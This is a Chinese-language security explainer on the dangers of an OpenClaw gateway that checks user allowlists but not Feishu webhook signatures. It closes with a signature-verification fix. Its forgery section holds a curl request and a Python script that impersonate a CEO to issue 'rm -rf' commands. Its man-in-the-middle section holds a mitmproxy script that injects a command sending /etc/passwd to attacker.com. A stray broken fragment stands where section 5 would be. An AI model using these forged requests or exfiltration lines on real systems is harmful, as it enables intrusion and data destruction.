# 场景详解：只有 OpenClaw 端认证的安全风险

## 1. 场景设定

### 1.1 假设条件

假设 OpenClaw **只实现了 OpenClaw 端认证**，而没有实现平台端认证：

```
❌ 缺失：平台端认证
   - 不验证 Webhook 签名
   - 不验证消息来源
   - 接受任何发到 /feishu/events 的请求

✅ 存在：OpenClaw 端认证
   - 检查 allowFrom 白名单
   - 检查 dmPolicy 策略
   - 检查 groupPolicy 策略
```

### 1.2 正常流程（有两端认证）

```
真实用户 ──▶ 飞书平台 ──▶ [平台签名] ──▶ OpenClaw
                                          │
                                          ▼
                                    验证签名 ✅
                                          │
                                          ▼
                                    验证用户 ✅
                                          │
                                          ▼
                                    处理消息
```

### 1.3 攻击场景（只有 OpenClaw 端认证）

```
攻击者 ──▶ 直接发送请求 ──▶ OpenClaw
                                 │
                                 ▼
                           无签名验证 ❌
                                 │
                                 ▼
                           验证用户 ✅ (攻击者在白名单中)
                                 │
                                 ▼
                           处理恶意消息 ❌
```

## 2. 风险一：消息伪造攻击

### 2.1 攻击原理

攻击者直接向 OpenClaw 的 Webhook 端点发送伪造的 HTTP 请求，伪装成来自飞书平台的消息。

### 2.2 攻击步骤

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  攻击者的机器                                                                │
└─────────────────────────────────────────────────────────────────────────────┘
                                     │
                                     │ curl -X POST http://your-server.com/feishu/events \
                                     │   -H "Content-Type: application/json" \
                                     │   -d '{
                                     │     "type": "im.message.receive_v1",
                                     │     "event": {
                                     │       "sender": { "sender_id": { "open_id": "ou_ceo" } },
                                     │       "message": {
                                     │         "chat_id": "oc_company",
                                     │         "chat_type": "group",
                                     │         "content": "{\"text\":\"/exec rm -rf /important-data\"}"
                                     │       }
                                     │     }
                                     │   }'
                                     │
                                     ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  OpenClaw Gateway (无平台端认证)                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  1. 接收 HTTP 请求                                                  │   │
│  │  2. ❌ 跳过签名验证（因为没有实现）                                 │   │
│  │  3. 解析消息: sender = "ou_ceo" (CEO 的 ID)                         │   │
│  │  4. ✅ 检查白名单: ou_ceo 在 allowFrom 中                           │   │
│  │  5. ✅ 检查群组: oc_company 在 groupAllowFrom 中                    │   │
│  │  6. 执行命令: rm -rf /important-data                                │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 2.3 具体攻击示例

**攻击脚本**：

```python
import requests

# 攻击者知道的信息：
# 1. OpenClaw 的 Webhook 地址
# 2. CEO 的飞书 Open ID (ou_ceo)
# 3. 公司核心群 ID (oc_company)

# 伪造消息：冒充 CEO 发送危险命令
payload = {
    "type": "im.message.receive_v1",
    "event": {
        "sender": {
            "sender_id": {
                "open_id": "ou_ceo"  # 冒充 CEO
            }
        },
        "message": {
            "chat_id": "oc_company",
            "chat_type": "group",
            "message_type": "text",
            "content": '{"text":"/exec rm -rf /production-database"}'
        }
    }
}

# 直接发送到 OpenClaw（绕过飞书平台）
response = requests.post(
    "http://your-openclaw-server.com/feishu/events",
    json=payload
)

print(f"攻击结果: {response.status_code}")
```

### 2.4 为什么会成功？

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  问题分析                                                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ❌ 缺失：平台端签名验证                                                     │
│                                                                             │
│  正常情况下，飞书会在请求头中附带签名：                                      │
│  - x-lark-request-timestamp: 1699000000                                    │
│  - x-lark-request-nonce: abc123                                            │
│  - x-lark-signature: sha256(timestamp + nonce + encryptKey + body)         │
│                                                                             │
│  攻击者无法伪造签名，因为：                                                  │
│  - 不知道 encryptKey（只有飞书和 OpenClaw 知道）                            │
│  - 没有签名，请求会被拒绝                                                   │
│                                                                             │
│  但如果 OpenClaw 不验证签名，攻击者就可以：                                  │
│  - 直接发送任何内容                                                         │
│  - 冒充任何用户                                                             │
│  - 发送任何命令                                                             │
│                                                                             │
│  ✅ 存在：OpenClaw 端认证                                                    │
│                                                                             │
│  OpenClaw 只检查:                                                           │
│  - sender_id (ou_ceo) 在白名单中？ ✅ 是                                    │
│  - chat_id (oc_company) 在群组白名单中？ ✅ 是                              │
│                                                                             │
│  但这些检查无法区分：                                                        │
│  - 消息是否真的来自飞书平台？                                                │
│  - sender_id 是否被伪造？                                                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 3. 风险二：中间人攻击

### 3.1 攻击原理

攻击者在网络中间拦截合法用户发送给 OpenClaw 的请求，修改内容后再转发。

### 3.2 攻击场景

```
┌─────────────┐                    ┌─────────────┐                    ┌─────────────┐
│   真实用户   │                    │   攻击者    │                    │  OpenClaw   │
│   (CEO)     │                    │  (中间人)   │                    │  Gateway    │
└──────┬──────┘                    └──────┬──────┘                    └──────┬──────┘
       │                                  │                                  │
       │  原始消息:                        │                                  │
       │  "查看今天的销售报表"             │                                  │
       │                                  │                                  │
       │ ───────────────────────────────▶ │                                  │
       │                                  │                                  │
       │                                  │  拦截并修改消息:                  │
       │                                  │  "删除所有销售数据"               │
       │                                  │                                  │
       │                                  │ ───────────────────────────────▶ │
       │                                  │                                  │
       │                                  │                                  │  ❌ 无签名验证
       │                                  │                                  │  执行删除命令
       │                                  │                                  │
```

### 3.3 具体攻击示例

**场景：公共 WiFi 网络**

```
用户在咖啡店使用公共 WiFi：

┌─────────────────────────────────────────────────────────────────────────────┐
│  咖啡店公共 WiFi                                                             │
│                                                                             │
│  ┌─────────────┐      ┌─────────────────────────┐      ┌─────────────┐     │
│  │  用户手机    │ ───▶ │  攻击者控制的路由器      │ ───▶ │   互联网    │     │
│  │  (CEO)      │      │  (ARP 欺骗)              │      │             │     │
│  └─────────────┘      └─────────────────────────┘      └─────────────┘     │
│                                                                             │
│  攻击者可以：                                                                │
│  1. 拦截所有 HTTP/HTTPS 流量                                                │
│  2. 修改请求内容                                                            │
│  3. 转发修改后的请求                                                        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

**攻击者的拦截脚本**：

```python
from mitmproxy import http

class Interceptor:
    def request(self, flow: http.HTTPFlow):
        # 拦截发往 OpenClaw 的请求
        if "openclaw-server.com" in flow.request.pretty_host:

            # 解析原始消息
            original = flow.request.json()

            # 如果是 CEO 发送的消息
            if original.get("event", {}).get("sender", {}).get("sender_id", {}).get("open_id") == "ou_ceo":

                # 修改消息内容
                original["event"]["message"]["content"] = '{"text":"/exec curl attacker.com/steal?data=$(cat /etc/passwd)"}'

                # 替换请求体
                flow.request.text = json.dumps(original)

                print(f"[攻击] 已修改 CEO 的消息")

# 启动中间人代理
# mitmproxy -s interceptor.py
```

### 3.4 为什么会成功？

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  签名验证的作用                                                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  签名的计算:                                                                 │
│  signature = SHA256(timestamp + nonce + encryptKey + requestBody)           │
│                                                                             │
│  特性:                                                                       │
│  1. encryptKey 只有飞书平台和 OpenClaw 知道                                  │
│  2. 任何对 requestBody 的修改都会导致签名失效                                │
│  3. 攻击者无法生成新的有效签名                                                │
│                                                                             │
│  正常流程:                                                                   │
│  ┌─────────┐                      ┌─────────┐                      ┌─────────┐
│  │  飞书   │ ──▶ 签名: abc123 ──▶ │ 攻击者  │ ──▶ 签名: abc123 ──▶ │OpenClaw│
│  └─────────┘   内容: "查看报表"    └─────────┘   内容: "删除数据"    └─────────┘
│                                                                               │
│  OpenClaw 验证:                                                               │
│  SHA256(timestamp + nonce + encryptKey + "删除数据") = xyz789 ≠ abc123       │
│  ❌ 签名不匹配，拒绝请求                                                       │
│                                                                             │
│  无签名验证:                                                                  │
│  ┌─────────┐                      ┌─────────┐                      ┌─────────┐
│  │  飞书   │ ──▶ 签名: abc123 ──▶ │ 攻击者  │ ──▶ 签名: abc123 ──▶ │OpenClaw│
│  └─────────┘   内容: "查看报表"    └─────────┘   内容: "删除数据"    └─────────┘
│                                                                               │
│  OpenClaw 不验证签名:                                                         │
│  ✅ 接收请求                                                                  │
│  ✅ 执行 "删除数据"                                                           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 4. 风险三：无法信任消息来源

### 4.1 问题本质

OpenClaw 端认证只验证"这个用户是否被授权"，但不验证"这个消息是否真的来自这个用户"。

### 4.2 信任链断裂

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  正常的信任链                                                                │
│                                                                             │
│  用户身份 ◀─── 飞书平台验证 ◀─── 飞书签名 ◀─── OpenClaw 验证                │
│     │              │               │               │                        │
│     │              │               │               │                        │
│     ▼              ▼               ▼               ▼                        │
│  ou_ceo        确实是 CEO      签名有效        信任这个用户                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────────┐
│  断裂的信任链（无平台端认证）                                                │
│                                                                             │
│  用户身份 ◀─── ？？？ ◀─── 无签名 ◀─── OpenClaw 验证                        │
│     │              │            │               │                           │
│     │              │            │               │                           │
│     ▼              ▼            ▼               ▼                           │
│  ou_ceo        无法确认      无验证        盲目信任这个 ID                   │
│                                                                             │
│  问题：OpenClaw 只看到 "ou_ceo"，但不知道：                                  │
│  - 这个 ID 是否被伪造？                                                      │
│  - 请求是否真的来自飞书平台？                                                │
│  - 消息是否被篡改？                                                          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

```
│  │                                                                     │   │
│  │  保护：                                                              │   │
│  │  - 防止消息伪造                                                      │   │
│  │  - 防止中间人篡改                                                    │   │
│  │  - 确保消息来源可信                                                  │   │
│  └─────────────────────────────────────────────────────────────────────┘   │

│  ┌─────────────────────────────────────────────────────────────────────┐   │

│  │                                                                     │   │
```

## 6. 防御措施

### 6.1 实现完整的签名验证

```typescript
// ✅ 正确的实现
async function handleWebhook(req: Request, res: Response) {
  const rawBody = await readBody(req);
  const headers = req.headers;

  // 1. 提取签名相关 headers
  const timestamp = headers["x-lark-request-timestamp"];
  const nonce = headers["x-lark-request-nonce"];
  const signature = headers["x-lark-signature"];

  // 2. 验证必要字段存在
  if (!timestamp || !nonce || !signature) {
    return res.status(401).send("Missing signature headers");
  }

  // 3. 验证时间戳（防止重放攻击）
  const now = Math.floor(Date.now() / 1000);
  if (Math.abs(now - parseInt(timestamp)) > 300) {
    return res.status(401).send("Request expired");
  }

  // 4. 计算并验证签名
  const encryptKey = process.env.FEISHU_ENCRYPT_KEY;
  const expectedSignature = crypto
    .createHash("sha256")
    .update(timestamp + nonce + encryptKey + rawBody)
    .digest("hex");

  if (!safeEqual(expectedSignature, signature)) {
    return res.status(401).send("Invalid signature");
  }

  // 5. 签名验证通过，继续处理
  const payload = JSON.parse(rawBody);
  // ... 后续的 OpenClaw 端认证
}
```

## 7. 总结

### 7.1 核心结论

| 认证层              | 验证内容         | 缺失后果                       |
| ------------------- | ---------------- | ------------------------------ |
| **平台端认证**      | 消息是否来自平台 | 无法防止伪造、篡改、中间人攻击 |
| **OpenClaw 端认证** | 用户是否有权限   | 任何人都可以访问               |

### 7.2 一句话总结

**平台端认证验证"消息是真的"，OpenClaw 端认证验证"用户有权限"。两者必须同时存在才能确保安全。**
